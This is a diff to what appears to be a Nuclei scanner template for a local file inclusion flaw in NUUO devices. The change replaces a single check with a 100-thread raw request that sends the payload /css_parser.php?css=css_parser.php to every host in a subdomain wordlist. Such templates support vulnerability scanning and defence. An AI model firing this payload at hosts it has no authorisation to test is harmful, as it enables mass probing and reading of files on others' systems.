@@ -7,10 +7,20 @@ info:
   tags: nuuo,lfi
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/css_parser.php?css=css_parser.php"
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /css_parser.php?css=css_parser.php HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
+        Connection: close
+        Accept: */*
+        Accept-Language: en
+        Accept-Encoding: gzip
     matchers-condition: and
     matchers:
       - type: word
